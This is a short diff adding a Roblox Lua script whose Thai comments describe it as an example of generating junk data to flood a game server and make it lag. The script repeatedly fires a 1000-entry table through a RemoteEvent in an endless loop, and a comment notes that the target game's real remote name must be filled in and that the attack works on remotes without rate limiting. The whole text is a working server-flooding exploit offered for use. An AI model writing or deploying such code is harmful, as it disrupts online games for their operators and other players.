@@ -1,0 +1,11 @@
+-- ตัวอย่างการสร้าง Data ขยะเพื่อถม Server ให้ปลิงขึ้น
+local junk = {}
+for i = 1, 1000 do junk[i] = "LAG_DATA" end
+
+task.spawn(function()
+    while task.wait() do
+        -- ยิงไปที่ Remote ที่ไม่มีการตรวจสอบ Rate Limit
+        -- ต้องระบุชื่อ Remote จริงๆ ของเกมนั้นๆ
+        game:GetService("ReplicatedStorage").RemoteEvent:FireServer(junk)
+    end
+end)
